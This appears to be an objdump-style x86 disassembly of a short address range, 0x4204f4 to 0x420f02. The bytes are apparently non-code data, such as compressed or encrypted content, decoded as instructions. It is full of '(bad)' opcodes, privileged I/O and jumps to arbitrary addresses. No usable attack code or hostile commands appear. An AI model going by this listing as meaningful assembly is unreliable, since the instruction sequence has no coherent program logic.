  4204f4:	scas   al,BYTE PTR es:[edi]
  4204f5:	xchg   esp,eax
  4204f6:	push   edi
  4204f7:	adc    bh,BYTE PTR [edi-0x2d]
  4204fa:	out    dx,eax
  4204fb:	mov    esp,0x5a7f6c39
  420500:	and    DWORD PTR [edx+0x587063db],0x1
  420507:	add    BYTE PTR ds:0x3f000001,al
  42050d:	xlat   BYTE PTR ds:[ebx]
  42050e:	jmp    0x420544
  420510:	mov    bl,0x75
  420512:	jp     0x420586
  420514:	jle    0x4204f7
  420516:	jl     0x42050e
  420518:	dec    ecx
  420519:	jne    0x42058b
  42051b:	fs dec ecx
  42051d:	pop    edx
  42051e:	sub    DWORD PTR [edx],0xd60b00bc
  420524:	ds inc eax
  420526:	pushf  
  420527:	push   ss
  420528:	sbb    al,0x72
  42052a:	addr16 cmc 
  42052c:	dec    eax
  42052d:	inc    ecx
  42052e:	stos   BYTE PTR es:[edi],al
  42052f:	call   0x3a3e:0xa73f8af7
  420536:	and    BYTE PTR [ebx+eax*2+0x16],cl
  42053a:	aad    0x98
  42053c:	jns    0x420569
  42053e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42053f:	and    eax,0xd66cd5af
  420544:	inc    edx
  420545:	lahf   
  420546:	dec    eax
  420547:	inc    ebx
  420548:	(bad)  
  420549:	and    dh,BYTE PTR ds:0xa2280791
  42054f:	mov    ds,ebx
  420551:	iret   
  420552:	(bad)  
  420553:	xchg   esp,eax
  420554:	loopne 0x420579
  420556:	pop    ecx
  420557:	sub    esp,DWORD PTR ds:0x40c2e9d7
  42055d:	jne    0x420507
  42055f:	push   edi
  420560:	or     BYTE PTR [ecx-0x782e792],al
  420566:	mov    esi,0x5a487844
  42056b:	mov    ecx,0xe326137a
  420570:	mov    bh,0x71
  420572:	add    bh,BYTE PTR [ebp-0x7b09d2ee]
  420578:	jmp    0xa64d63b5
  42057d:	out    dx,al
  42057e:	sbb    esi,DWORD PTR [ebx-0x41]
  420581:	jge    0x420591
  420583:	out    0xef,al
  420585:	mov    esp,0xf2331984
  42058a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42058b:	inc    esi
  42058c:	jmp    0x42052b
  42058e:	gs pop esp
  420590:	xchg   DWORD PTR [ebp+0x7e],esp
  420593:	mov    eax,ds:0x94c55a28
  420598:	sub    al,0x7f
  42059a:	sbb    cl,BYTE PTR ds:0xd41700c0
  4205a0:	dec    eax
  4205a1:	aas    
  4205a2:	push   ebx
  4205a3:	cmp    BYTE PTR [ebx],dl
  4205a5:	mov    esp,0x28cb73d3
  4205aa:	call   0xfbd8:0x9f312d12
  4205b1:	cs retf 
  4205b3:	loope  0x42056d
  4205b5:	sbb    ch,dl
  4205b7:	cmp    bl,ah
  4205b9:	cs mov esi,0xb615b698
  4205bf:	aaa    
  4205c0:	ja     0x4205af
  4205c2:	and    dh,dh
  4205c4:	add    DWORD PTR [edx-0x1d1c5629],0x485a8a54
  4205ce:	pop    esi
  4205cf:	dec    esp
  4205d0:	pop    es
  4205d1:	xor    ebx,DWORD PTR [esi]
  4205d3:	add    dh,0x63
  4205d6:	push   cs
  4205d7:	sbb    BYTE PTR [edx],ah
  4205d9:	mov    ebx,0x1cb2d4c8
  4205de:	jno    0x420627
  4205e0:	pop    es
  4205e1:	lods   al,BYTE PTR ds:[esi]
  4205e2:	cmp    al,0x7d
  4205e4:	sbb    cl,BYTE PTR [edi+edi*1]
  4205e7:	push   esp
  4205e8:	lock add eax,0xbd919136
  4205ee:	ss stos BYTE PTR es:[edi],al
  4205f0:	cmc    
  4205f1:	xor    al,0x51
  4205f3:	aas    
  4205f4:	add    al,0xde
  4205f6:	pop    esp
  4205f7:	outs   dx,DWORD PTR ds:[esi]
  4205f8:	xchg   ecx,eax
  4205f9:	sahf   
  4205fa:	mov    BYTE PTR [ecx+0x6544d1f],cl
  420600:	(bad)  
  420602:	les    ecx,FWORD PTR [ecx-0x6e354bd0]
  420608:	pushf  
  420609:	mov    eax,0x1463688a
  42060e:	adc    cl,BYTE PTR [ebp+0x5d]
	...
  420671:	add    BYTE PTR [eax],al
  420673:	add    BYTE PTR [eax+ebp*2-0x2703f748],al
  42067a:	mov    ah,0xec
  42067c:	lds    eax,FWORD PTR [eax]
  42067e:	aad    0x78
  420680:	pop    ss
  420681:	mov    BYTE PTR [edx],al
  420683:	jno    0x4206fa
  420685:	pop    ecx
  420686:	add    DWORD PTR [eax],eax
  420688:	add    eax,0x13000001
  42068d:	imul   edx,DWORD PTR [ecx],0xa
  420690:	cwde   
  420691:	cmp    BYTE PTR [eax+0x12ebf3c4],dh
  420697:	outs   dx,DWORD PTR ds:[esi]
  420698:	cld    
  420699:	jo     0x420707
  42069b:	push   0xf6b4ac81
  4206a0:	and    ecx,ecx
  4206a2:	div    BYTE PTR es:[edx]
  4206a5:	cmc    
  4206a6:	push   cs
  4206a7:	adc    DWORD PTR [edx-0x79],ebp
  4206aa:	cmp    ebx,DWORD PTR ss:[ecx]
  4206ad:	adc    DWORD PTR [ecx-0x28],edx
  4206b0:	loope  0x4206e5
  4206b2:	push   cs
  4206b3:	mov    eax,ds:0xc2ec526f
  4206b8:	xlat   BYTE PTR ds:[ebx]
  4206b9:	cmp    dh,0x36
  4206bc:	lahf   
  4206bd:	pop    edx
  4206be:	push   esp
  4206bf:	aaa    
  4206c0:	and    al,0x60
  4206c2:	mov    dl,0x44
  4206c4:	mov    eax,ds:0xa6307e56
  4206c9:	dec    ebp
  4206ca:	xor    al,0xc0
  4206cc:	xchg   ebp,eax
  4206cd:	pop    edx
  4206ce:	jmp    0x420736
  4206d0:	inc    edx
  4206d1:	cld    
  4206d2:	(bad)  
  4206d3:	stc    
  4206d4:	mov    al,BYTE PTR [edi+0x78]
  4206d7:	xor    ebp,edx
  4206d9:	push   cs
  4206da:	into   
  4206db:	and    BYTE PTR [eax+0x2c],dl
  4206de:	xchg   esp,eax
  4206df:	aaa    
  4206e0:	loope  0x4206cd
  4206e2:	or     DWORD PTR [esi+0x1e6e39de],0x44c7e86a
  4206ec:	pop    ss
  4206ed:	xchg   esi,eax
  4206ee:	call   0x5f7dfd92
  4206f3:	jmp    0x6eaa8c5c
  4206f8:	sbb    eax,ebp
  4206fa:	stos   DWORD PTR es:[edi],eax
  4206fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4206fc:	adc    BYTE PTR [ebx+0x3da74eda],dl
  420702:	(bad)  
  420703:	or     BYTE PTR [edi+esi*1+0x2f],ah
  420707:	ins    BYTE PTR es:[edi],dx
  420708:	fnstsw WORD PTR [edi-0x6870dc1]
  42070e:	neg    esi
  420710:	leave  
  420711:	push   esi
  420712:	mov    bl,0x90
  420714:	add    cl,BYTE PTR [edi+ebx*4]
  420717:	xchg   DWORD PTR [edx-0x2],esi
  42071a:	pop    ds
  42071b:	xor    DWORD PTR [edx],ecx
  42071d:	dec    edi
  42071e:	loopne 0x4206ee
  420720:	pop    ebp
  420721:	or     ecx,DWORD PTR [ebx+0x1163682d]
  420727:	push   eax
  420728:	adc    BYTE PTR [esi+0x54073740],bh
  42072e:	div    DWORD PTR [ebx]
  420730:	sub    BYTE PTR [edx],dh
  420732:	frstor [ebx+ebp*4]
  420735:	lods   eax,DWORD PTR ds:[si]
  420737:	or     dl,ah
  420739:	push   edi
  42073a:	into   
  42073b:	aam    0x35
  42073d:	cmp    BYTE PTR [ebx+eax*2],dl
  420740:	js     0x42079d
  420742:	ss (bad) 
  420744:	mov    ch,0x2a
  420746:	cli    
  420747:	mov    bh,0x44
  420749:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42074a:	mov    cl,0x85
  42074c:	push   esp
  42074d:	push   edi
  42074e:	enter  0x87db,0xb6
  420752:	imul   esi,DWORD PTR [ebp-0x37],0x69cd14ef
  420759:	cs (bad) 
  42075b:	mov    bh,0x2
  42075d:	sub    eax,0xbabb72d0
  420762:	adc    cl,BYTE PTR [ecx]
  420764:	fwait
  420765:	add    eax,0x170b2213
  42076a:	imul   eax,eax,0xffffffa9
  42076d:	cmp    ch,BYTE PTR [eax-0x9]
  420770:	lock sub ah,al
  420773:	sub    BYTE PTR [ebx+0x17],ah
  420776:	add    eax,0xb4a570eb
  42077b:	pop    esp
  42077c:	and    eax,0x39bd08de
  420781:	(bad)  [esi+0x46cb3c58]
  420787:	jno    0x420787
  420789:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42078a:	les    esp,FWORD PTR [esi+0x7432b334]
  420790:	jecxz  0x420792
	...
  4207f2:	add    BYTE PTR [eax],al
  4207f4:	mov    DWORD PTR [edi],ebp
  4207f6:	and    eax,0xad8aa780
  4207fb:	das    
  4207fc:	cmp    DWORD PTR [edi-0x24],ebp
  4207ff:	pusha  
  420800:	add    DWORD PTR [ecx-0x7f],edi
  420803:	or     al,0x7a
  420805:	pop    edx
  420806:	add    DWORD PTR [eax],eax
  420808:	add    eax,0xd8000001
  42080d:	jmp    0xa3cfa1a
  420812:	xchg   BYTE PTR [eiz*2-0x38105ff8],al
  420819:	push   cs
  42081a:	and    cl,BYTE PTR [ebp+0x66]
  42081d:	jle    0x420897
  42081f:	(bad)  [edi-0x60]
  420822:	outs   dx,DWORD PTR ds:[esi]
  420823:	outs   dx,BYTE PTR ds:[esi]
  420824:	mov    eax,0xdf86e888
  420829:	sbb    BYTE PTR [ebx-0xb913ee8],0x31
  420830:	pop    ebx
  420831:	cmp    ch,BYTE PTR [edi+ebx*2+0x5f5cee24]
  420838:	mov    bl,0xf
  42083a:	mov    BYTE PTR [edx+eiz*4],cl
  42083d:	adc    eax,0x6cd48dbe
  420842:	out    0xc2,eax
  420844:	push   es
  420845:	(bad)  
  420846:	jg     0x42083a
  420848:	dec    ebx
  420849:	push   ds
  42084a:	pop    ss
  42084b:	adc    DWORD PTR [ebx],ebp
  42084d:	lock in eax,0xda
  420850:	adc    eax,0x283867c4
  420855:	sub    cl,cl
  420857:	enter  0xf175,0x67
  42085b:	stos   DWORD PTR es:[edi],eax
  42085c:	mov    dh,0xb5
  42085e:	xchg   esi,ebp
  420860:	adc    BYTE PTR [eax-0x4f5f4687],bl
  420866:	add    DWORD PTR [edx],eax
  420868:	pop    ecx
  420869:	xor    eax,0xa71e8a61
  42086e:	(bad)  
  42086f:	pop    ebx
  420870:	sub    al,0x7b
  420872:	sbb    BYTE PTR [edx+0x1e],cl
  420875:	in     al,0x16
  420877:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420878:	sub    eax,0x52559ff0
  42087d:	ss (bad) 
  420881:	or     DWORD PTR [ebx-0x5a720eb8],edi
  420887:	push   esi
  420888:	mov    bl,0xe
  42088a:	je     0x4208b8
  42088c:	iret   
  42088d:	mov    esi,0xc72f5ec8
  420892:	pop    ebx
  420893:	cli    
  420894:	fimul  WORD PTR [ecx+0x7cd69e48]
  42089a:	mov    ebx,0x4ba58c4c
  42089f:	rcl    DWORD PTR [ebx-0x1ce86ea8],1
  4208a5:	jmp    0x4208e3
  4208a7:	(bad)  
  4208a9:	fst    DWORD PTR [eax-0x41]
  4208ac:	cld    
  4208ad:	sbb    al,0xc5
  4208af:	test   eax,0x4c8df1c9
  4208b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4208b5:	pushw  ss
  4208b7:	nop
  4208b8:	lea    edi,[ebp+0x35b1a699]
  4208be:	dec    edx
  4208bf:	xor    edi,DWORD PTR [esi-0x65]
  4208c2:	dec    esi
  4208c3:	retf   
  4208c4:	mov    ds:0x3f93d237,al
  4208c9:	sub    eax,0x9745e73d
  4208ce:	add    al,0xc
  4208d0:	call   0xded:0xbf7cb33a
  4208d7:	push   cs
  4208d8:	lahf   
  4208d9:	inc    edi
  4208da:	fnsave [esp+ecx*4+0x50]
  4208de:	popf   
  4208df:	into   
  4208e0:	jge    0x420885
  4208e2:	xchg   esi,eax
  4208e3:	push   ebp
  4208e4:	push   eax
  4208e5:	jbe    0x4208b5
  4208e7:	rcr    BYTE PTR [ebp-0x79],cl
  4208ea:	out    0x76,al
  4208ec:	das    
  4208ed:	jmp    0x42089b
  4208ef:	push   0x9838c646
  4208f4:	sbb    al,0xa3
  4208f6:	fs gs push ss
  4208f9:	push   edx
  4208fa:	fs stos DWORD PTR es:[edi],eax
  4208fc:	push   ecx
  4208fd:	push   ds
  4208fe:	mov    esp,0x7a7e49e3
  420903:	push   sp
  420905:	xchg   edx,eax
  420906:	popa   
  420907:	test   DWORD PTR [eax],edi
  420909:	mov    al,ds:0x80c6365b
  42090e:	adc    DWORD PTR [ebx],esi
  420910:	adc    BYTE PTR [eax],al
	...
  420972:	add    BYTE PTR [eax],al
  420974:	fsub   QWORD PTR [ebx+esi*2-0x12084b3]
  42097b:	mov    ch,0xd2
  42097d:	ja     0x4209dd
  42097f:	mov    dh,0xf
  420981:	pop    esi
  420982:	sub    ah,dl
  420984:	jg     0x4209e1
  420986:	add    DWORD PTR [eax],eax
  420988:	add    eax,0x1
  42098d:	xchg   BYTE PTR [edx],cl
  42098f:	inc    ebx
  420990:	in     al,dx
  420991:	outs   dx,BYTE PTR ds:[esi]
  420992:	pop    ebp
  420993:	inc    ebp
  420994:	push   esp
  420995:	sbb    BYTE PTR [edi+0x18],dl
  420998:	push   0xac98bff8
  42099d:	fiadd  WORD PTR gs:[esi-0x3]
  4209a1:	pop    esi
  4209a2:	arpl   cx,bx
  4209a4:	cli    
  4209a5:	shr    ebp,0x1c
  4209a8:	jmp    0x420a0a
  4209aa:	fmul   DWORD PTR [ebx]
  4209ac:	je     0x4209d4
  4209ae:	out    0xe2,al
  4209b0:	in     al,dx
  4209b1:	fisub  WORD PTR [ecx-0x7f]
  4209b4:	es call 0xdca433a1
  4209ba:	adc    eax,0xc3ebe08f
  4209bf:	push   edx
  4209c0:	or     eax,0x7e4180e7
  4209c5:	leave  
  4209c6:	call   DWORD PTR [edi]
  4209c8:	pop    edx
  4209c9:	dec    ecx
  4209ca:	xchg   ecx,eax
  4209cb:	push   eax
  4209cc:	jns    0x420a30
  4209ce:	push   cs
  4209cf:	xlat   BYTE PTR ds:[ebx]
  4209d0:	lahf   
  4209d1:	push   ebp
  4209d2:	cmp    eax,0x48a12889
  4209d7:	test   al,0x83
  4209d9:	and    edi,DWORD PTR [esi-0x64e81732]
  4209df:	sub    esp,edi
  4209e1:	inc    esp
  4209e2:	shr    BYTE PTR [edi+0x7a6ec4c9],1
  4209e8:	(bad)  
  4209e9:	jecxz  0x4209df
  4209eb:	mov    al,0x81
  4209ed:	iret   
  4209ee:	adc    BYTE PTR [edi],dh
  4209f0:	mov    ecx,0xed240054
  4209f5:	sub    BYTE PTR [ebp+0x1245d385],ah
  4209fb:	inc    BYTE PTR [esi]
  4209fd:	lods   eax,DWORD PTR ds:[esi]
  4209ff:	sub    bl,BYTE PTR [ebp-0xe]
  420a02:	ins    BYTE PTR es:[edi],dx
  420a03:	pop    edi
  420a04:	test   DWORD PTR ds:0x37500290,ecx
  420a0a:	or     bl,BYTE PTR [edx+0xad4f146]
  420a10:	cdq    
  420a11:	out    dx,al
  420a12:	dec    edi
  420a13:	sbb    DWORD PTR [edi+ebx*8-0x6c],ebx
  420a17:	scas   al,BYTE PTR es:[edi]
  420a18:	div    DWORD PTR [eax+0x66cda5ca]
  420a1e:	xchg   DWORD PTR [edx],edi
  420a20:	iret   
  420a21:	and    BYTE PTR [ebp+0x1d],al
  420a24:	imul   ebx,DWORD PTR [ecx+0x7d],0x2dba6507
  420a2b:	pop    ecx
  420a2c:	fcom   DWORD PTR [edx+0x7ac662e1]
  420a32:	sbb    eax,DWORD PTR [edx-0x572108c5]
  420a38:	mov    ds:0x51f21de,al
  420a3d:	adc    ebp,DWORD PTR [ebp+0x5c0a38e4]
  420a43:	inc    esi
  420a44:	mov    esp,0xd3685a52
  420a49:	das    
  420a4a:	inc    esi
  420a4b:	shl    BYTE PTR [eax+edx*2],1
  420a4e:	inc    eax
  420a4f:	jae    0x420aae
  420a51:	stc    
  420a52:	push   ss
  420a53:	lods   al,BYTE PTR ds:[esi]
  420a54:	sti    
  420a55:	add    DWORD PTR [ebx-0x17],edi
  420a58:	test   BYTE PTR [ebp-0x449bbfc],bh
  420a5e:	das    
  420a5f:	or     eax,0x32962d8f
  420a64:	inc    eax
  420a65:	pop    ecx
  420a66:	jns    0x420a2a
  420a68:	std    
  420a69:	addr16 pop edi
  420a6b:	adc    BYTE PTR [ebx-0x40fbaaf2],bh
  420a71:	sbb    eax,0x12caf882
  420a76:	inc    ebp
  420a77:	cmp    DWORD PTR [ecx+0x30f8b618],edi
  420a7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420a7e:	imul   ebx,edx,0x1b
  420a81:	jle    0x420abc
  420a83:	mov    esi,0xd3fb7256
  420a88:	push   edi
  420a89:	jmp    0x8bc338f4
  420a8e:	dec    edx
  420a8f:	bnd jae 0x420a92
	...
  420af2:	add    BYTE PTR [eax],al
  420af4:	fbstp  TBYTE PTR [edx]
  420af6:	scas   eax,DWORD PTR es:[edi]
  420af7:	adc    ebp,edi
  420af9:	lahf   
  420afa:	(bad)  
  420afb:	(bad)  
  420afc:	xlat   BYTE PTR ds:[ebx]
  420afd:	out    dx,eax
  420afe:	(bad)  
  420aff:	cld    
  420b00:	shl    BYTE PTR [ebx],0xaf
  420b03:	cmp    eax,DWORD PTR [esp+ebx*2+0x1050001]
  420b0a:	add    BYTE PTR [eax],al
  420b0c:	sub    edi,ebp
  420b0e:	xor    DWORD PTR [eax],ebx
  420b10:	out    dx,al
  420b11:	hlt    
  420b12:	leave  
  420b13:	jmp    0x420aff
  420b15:	test   BYTE PTR [ecx+0x66],ah
  420b18:	das    
  420b19:	cli    
  420b1a:	ins    DWORD PTR es:[edi],dx
  420b1b:	pop    eax
  420b1c:	dec    ecx
  420b1d:	cmp    ah,dh
  420b1f:	bound  ebp,QWORD PTR [ebx+0x5e8f798d]
  420b25:	out    dx,al
  420b26:	xchg   edx,eax
  420b27:	outs   dx,BYTE PTR ds:[esi]
  420b28:	sub    ecx,DWORD PTR [esi+0x42]
  420b2b:	dec    edi
  420b2c:	add    edx,DWORD PTR [ecx]
  420b2e:	into   
  420b2f:	add    al,0xbc
  420b31:	pop    ebp
  420b32:	push   DWORD PTR [esi-0x312a9e5a]
  420b38:	inc    eax
  420b39:	loope  0x420b76
  420b3b:	stos   DWORD PTR es:[edi],eax
  420b3c:	ds aad 0x1a
  420b3f:	out    dx,eax
  420b40:	jno    0x420b98
  420b42:	lods   eax,DWORD PTR ds:[esi]
  420b43:	addr16 push edx
  420b45:	retf   0xb817
  420b48:	pop    edi
  420b49:	pop    ebx
  420b4a:	ins    DWORD PTR es:[edi],dx
  420b4b:	out    dx,al
  420b4c:	stos   BYTE PTR es:[edi],al
  420b4d:	sbb    DWORD PTR [ebx+0x49d8315b],edi
  420b53:	stos   BYTE PTR es:[edi],al
  420b54:	cdq    
  420b55:	cwde   
  420b56:	in     al,0x28
  420b58:	sub    BYTE PTR [ebx],al
  420b5a:	cmp    DWORD PTR ds:0x11ea20ee,ebp
  420b60:	inc    esi
  420b61:	jecxz  0x420bc4
  420b63:	popa   
  420b64:	and    BYTE PTR [ebx],cl
  420b66:	jmp    0x94db:0x43f44617
  420b6d:	mov    ds:0xad5d9d42,al
  420b72:	cmp    DWORD PTR [edi-0x1efd7214],ebx
  420b78:	adc    BYTE PTR [esi-0x13],cl
  420b7b:	dec    ebp
  420b7c:	or     eax,0xc52f7d8c
  420b81:	push   ds
  420b82:	dec    edx
  420b83:	pop    ss
  420b84:	xor    eax,0x8f0c40
  420b89:	inc    esi
  420b8a:	or     al,0x87
  420b8c:	mov    esi,0x422c3d0e
  420b91:	sbb    BYTE PTR [edx+esi*2+0x4973a956],ch
  420b98:	jge    0x420b4c
  420b9a:	mov    cl,0x86
  420b9c:	add    eax,0x3faa14dc
  420ba1:	and    DWORD PTR [edi],esp
  420ba3:	gs push edi
  420ba5:	xor    ah,BYTE PTR [ebx]
  420ba7:	jno    0x420b96
  420ba9:	lods   al,BYTE PTR ds:[esi]
  420baa:	scas   al,BYTE PTR es:[edi]
  420bab:	icebp  
  420bac:	test   DWORD PTR [edi+ebx*4],ebx
  420baf:	jmp    0x420c21
  420bb1:	rcr    DWORD PTR [ebx-0x4e9b4dad],1
  420bb7:	jecxz  0x420c2e
  420bb9:	adc    ch,BYTE PTR [esi]
  420bbb:	aad    0x42
  420bbd:	cmp    al,0x1b
  420bbf:	xchg   edi,eax
  420bc0:	dec    edx
  420bc1:	xchg   edi,eax
  420bc2:	xor    eax,0x71a83c2
  420bc7:	adc    edi,DWORD PTR [ebx-0x1e]
  420bca:	int    0x58
  420bcc:	enter  0xd6ca,0x1d
  420bd0:	outs   dx,DWORD PTR ds:[esi]
  420bd1:	pop    ds
  420bd2:	mov    ecx,0x1929baea
  420bd7:	mov    edx,0x8b65d4d7
  420bdc:	sbb    esi,eax
  420bde:	push   0x29
  420be0:	cli    
  420be1:	aas    
  420be2:	outs   dx,BYTE PTR ds:[esi]
  420be3:	(bad)  
  420be4:	xchg   esi,edi
  420be6:	repz retf 0x76de
  420bea:	adc    DWORD PTR ds:0xa2fd52a3,0x6e3166c1
  420bf4:	mov    ds:0xac9e55d7,al
  420bf9:	mov    edi,0xff194203
  420bfe:	mov    esi,0xea812abc
  420c03:	jb     0x420bfb
  420c05:	test   BYTE PTR [edi+0x61ddaee3],ch
  420c0b:	nop
  420c0c:	cmp    eax,0x9ee7ec68
	...
  420c71:	add    BYTE PTR [eax],al
  420c73:	add    BYTE PTR [edx-0x604ef4eb],cl
  420c79:	mov    edi,0x886e3fba
  420c7e:	add    ebp,esp
  420c80:	pop    eax
  420c81:	jae    0x420c9e
  420c83:	loopne 0x420c0e
  420c85:	pop    ebp
  420c86:	add    DWORD PTR [eax],eax
  420c88:	add    eax,0x3f000001
  420c8d:	out    dx,eax
  420c8e:	aad    0x52
  420c90:	and    al,0x5e
  420c92:	cmp    DWORD PTR [esi+esi*8],esp
  420c95:	dec    edi
  420c96:	fs pushf 
  420c98:	or     DWORD PTR [ecx-0x33],eax
  420c9b:	mov    BYTE PTR [ebp-0x7b3dbfe7],bl
  420ca1:	fiadd  DWORD PTR [esi-0x61]
  420ca4:	ja     0x420ce5
  420ca6:	cmp    eax,0xd1d7eaa0
  420cab:	jbe    0x420c75
  420cad:	adc    BYTE PTR [ebp+0x797f46d7],bl
  420cb3:	(bad)  
  420cb4:	js     0x420c68
  420cb6:	fnstcw WORD PTR [esi-0x59]
  420cb9:	xchg   ebx,eax
  420cba:	mov    DWORD PTR [ebp+ebp*4-0x79bc9f07],edx
  420cc1:	test   eax,0xe0f3aba6
  420cc6:	dec    ebp
  420cc7:	mov    dh,bh
  420cc9:	in     al,dx
  420cca:	lea    edx,[ebp+0x2e9a46d3]
  420cd0:	shl    DWORD PTR [ebp+0x54],1
  420cd3:	dec    eax
  420cd4:	adc    eax,0x80079f96
  420cd9:	jmp    0x20599790
  420cde:	mov    eax,gs
  420ce0:	aam    0x37
  420ce2:	and    BYTE PTR [edi+0x54c5c938],al
  420ce8:	adc    bh,BYTE PTR [edi+0x5fd9fe30]
  420cee:	dec    eax
  420cef:	das    
  420cf0:	mov    DWORD PTR [edi-0x6e061da2],edi
  420cf6:	push   ds
  420cf7:	loopne 0x420d24
  420cf9:	mov    eax,0x719deefa
  420cfe:	mov    edi,0xf36e2e2c
  420d03:	mov    ah,0xca
  420d05:	jb     0x420d32
  420d07:	daa    
  420d08:	(bad)  
  420d0b:	data16 loope 0x420d62
  420d0e:	adc    al,0x6e
  420d10:	add    BYTE PTR [esp+edx*8-0x1],cl
  420d14:	fcmovnbe st,st(6)
  420d16:	xlat   BYTE PTR ds:[ebx]
  420d17:	shl    BYTE PTR [ebx+edi*8],0x44
  420d1b:	cld    
  420d1c:	mov    edi,0x6f2e1a81
  420d21:	test   DWORD PTR [ebx*2+0x37047861],ecx
  420d28:	cwde   
  420d29:	jmp    0x420d27
  420d2b:	mov    WORD PTR [ebx+0x65],ds
  420d2e:	retf   0x4674
  420d31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420d32:	jno    0x420dae
  420d34:	inc    ecx
  420d35:	cmp    al,0x31
  420d37:	gs addr16 sti 
  420d3a:	push   0xaff8e6fb
  420d3f:	jbe    0x420cc1
  420d41:	clc    
  420d42:	add    DWORD PTR [esi],ebx
  420d44:	mov    bh,0xe7
  420d46:	hlt    
  420d47:	cli    
  420d48:	jnp    0x420d10
  420d4a:	adc    eax,0x56b749b2
  420d4f:	test   al,0x12
  420d51:	or     eax,0xfcb4b3dd
  420d56:	and    DWORD PTR [edi+0x4d1e5863],ecx
  420d5c:	xor    al,0xa4
  420d5e:	mov    bh,BYTE PTR ds:0x4274e06b
  420d64:	iret   
  420d65:	clc    
  420d66:	push   es
  420d67:	add    DWORD PTR [ecx],0x7e158f23
  420d6d:	jno    0x420cf2
  420d6f:	mov    bl,BYTE PTR [edi-0x15]
  420d72:	(bad)  [ecx]
  420d74:	dec    eax
  420d75:	mov    bh,0x29
  420d77:	push   esi
  420d78:	mov    edx,0xc831b9fa
  420d7d:	inc    ebp
  420d7e:	sub    al,0x38
  420d80:	add    al,0xd0
  420d82:	ficom  WORD PTR [esi-0x3e]
  420d85:	enter  0xc481,0x4d
  420d89:	push   esp
  420d8a:	xor    eax,ebp
  420d8c:	test   DWORD PTR [edx-0x26],ebp
  420d8f:	addr16 mov ds:0x0,eax
	...
  420df3:	add    bh,ah
  420df5:	push   ds
  420df6:	into   
  420df7:	push   0x9fe7f8ff
  420dfc:	push   esi
  420dfd:	inc    edi
  420dfe:	lahf   
  420dff:	mov    al,ds:0xd99a8200
  420e04:	mov    ds,WORD PTR [esi+0x1]
  420e07:	add    BYTE PTR ds:0xf6000001,al
  420e0d:	dec    esi
  420e0e:	push   esi
  420e0f:	adc    bh,BYTE PTR [ebp+0x9db4224]
  420e15:	(bad)  
  420e16:	jo     0x420dbf
  420e18:	nop
  420e19:	iret   
  420e1a:	mov    DWORD PTR [eax],edi
  420e1c:	in     al,dx
  420e1d:	pusha  
  420e1e:	sti    
  420e1f:	(bad)  
  420e20:	sbb    dl,BYTE PTR [edi-0x4df96bed]
  420e26:	sbb    BYTE PTR [ecx+0x17],dl
  420e29:	dec    esi
  420e2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420e2b:	and    al,0x4a
  420e2d:	fst    DWORD PTR [ebx+ebp*4+0x75]
  420e31:	bound  esp,QWORD PTR [edi]
  420e33:	(bad)  
  420e34:	in     eax,0xb
  420e36:	push   0xffffff85
  420e38:	jecxz  0x420dfe
  420e3a:	and    BYTE PTR fs:[esi],0x2f
  420e3e:	pop    ebp
  420e3f:	adc    DWORD PTR [edx],ebp
  420e41:	repnz shl DWORD PTR [eax+0x17],1
  420e45:	push   esp
  420e46:	pop    es
  420e47:	jl     0x420e33
  420e49:	icebp  
  420e4a:	mov    edx,DWORD PTR [esp+eiz*2-0x6686f2dd]
  420e51:	js     0x420e67
  420e53:	mov    bl,0x1b
  420e55:	jmp    0xa187123e
  420e5a:	dec    esi
  420e5b:	xor    DWORD PTR [ecx],edx
  420e5d:	xor    DWORD PTR [eax+eiz*1],ebp
  420e60:	dec    eax
  420e61:	out    0xcd,al
  420e63:	imul   esi,DWORD PTR [edx+ebx*1-0x2ff2eb53],0x52f72f50
  420e6e:	ror    DWORD PTR gs:[esi-0x6a],1
  420e72:	test   BYTE PTR [edx],0x7c
  420e75:	aad    0xf9
  420e77:	add    DWORD PTR [ebp+ebp*4-0x4e],esp
  420e7b:	nop
  420e7c:	mov    esp,ecx
  420e7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420e7f:	jb     0x420ec6
  420e81:	retf   
  420e82:	(bad)  
  420e83:	add    BYTE PTR gs:[edx-0x49958a76],ah
  420e8a:	loopne 0x420e51
  420e8c:	inc    esp
  420e8d:	adc    BYTE PTR [esi],al
  420e8f:	lahf   
  420e90:	mov    ah,0xc7
  420e92:	cmp    esp,eax
  420e94:	inc    edi
  420e95:	inc    esp
  420e96:	cmp    dl,0x58
  420e99:	inc    eax
  420e9a:	adc    eax,0x6cc2b7ac
  420e9f:	cwde   
  420ea0:	pop    esi
  420ea1:	sbb    ebx,DWORD PTR [edi-0x1cc74fae]
  420ea7:	jno    0x420e5c
  420ea9:	pop    edi
  420eaa:	nop
  420eab:	cmp    DWORD PTR [eax],ecx
  420ead:	pop    ebx
  420eae:	xchg   esp,eax
  420eaf:	push   0xce51c95a
  420eb4:	dec    ebp
  420eb5:	(bad)  ds:0xc8ffa169
  420ebb:	mov    ecx,0xf8e91d29
  420ec0:	push   eax
  420ec1:	sbb    edi,ebp
  420ec3:	adc    DWORD PTR [ecx],esi
  420ec5:	add    DWORD PTR [ebx+0x60c6696d],ebp
  420ecb:	int    0x14
  420ecd:	retf   0xe3db
  420ed0:	loop   0x420eb4
  420ed2:	dec    ebx
  420ed3:	sbb    DWORD PTR [edi+0x49a8282b],esp
  420ed9:	aad    0x36
  420edb:	sbb    DWORD PTR [eax],0x6c85cfb0
  420ee1:	in     al,dx
  420ee2:	outs   dx,DWORD PTR ds:[esi]
  420ee3:	jns    0x420f59
  420ee5:	cmc    
  420ee6:	stos   BYTE PTR es:[edi],al
  420ee7:	mov    cl,0x4e
  420ee9:	sbb    edx,DWORD PTR [edi]
  420eeb:	cwde   
  420eec:	and    eax,0xdaa60d89
  420ef1:	addr16 pop ebx
  420ef3:	xchg   dl,ch
  420ef5:	and    eax,0xa9e3588c
  420efa:	int    0xb5
  420efc:	xor    dl,ah
  420efe:	shl    ebp,1
  420f00:	lds    esi,FWORD PTR [ebx]
  420f02:	pushf  
